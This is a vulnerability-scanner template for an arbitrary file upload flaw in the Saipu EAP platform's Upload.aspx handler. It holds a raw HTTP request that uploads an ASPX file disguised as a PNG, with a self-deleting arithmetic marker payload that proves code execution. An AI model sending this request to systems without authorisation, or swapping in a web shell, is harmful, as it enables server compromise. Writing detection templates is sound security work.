id: saipu-eap-fileupload

info:
  name: 赛普EAP企业适配管理平台 Upload.aspx - 任意文件上传
  author: qwtd
  severity: critical
  description: |
    赛普EAP企业适配管理平台Upload存在任意文件上传漏洞。
    文件路径为/IDWebSoft/{提取出的文件路径}} 有可能访问为403
  reference:
    - https://github.com/wy876/POC/blob/main/%E8%B5%9B%E6%99%AE/%E8%B5%9B%E6%99%AEEAP%E4%BC%81%E4%B8%9A%E9%80%82%E9%85%8D%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0Upload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
  tags: 赛普EAP

variables:
  s1: "{{rand_int(40000, 44800)}}"
  s2: "{{rand_int(40000, 44800)}}"

http:
  - raw:
      - |
        POST /IDWebSoft/Common/Handler/Upload.aspx HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Priority: u=0
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Content-Type: multipart/form-data; boundary=---------------------------328367279028471380642525145085
        Accept: */*
        Content-Length: 44892

        -----------------------------328367279028471380642525145085
        Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
        Content-Type: image/png

        <%@Page Language="C#" %>
        <% Response.Write({{s1}}*{{s2}}); System.IO.File.Delete(Request.PhysicalPath); %>
        -----------------------------328367279028471380642525145085--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Accessary"
          - "%7b%22name%22%3a%22"
        condition: and
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        regex:
          - '"path":"/(.*?).aspx'

  # - raw:
  #     - |
  #       GET /IDWebSoft/{{filepath}}.aspx HTTP/1.1
  #       Host: {{Hostname}}

  #   matchers-condition: and
  #   matchers:
  #     - type: status
  #       status:
  #         - 200
  #     - type: word
  #       part: body
  #       words:
  #         - "{{product}}"
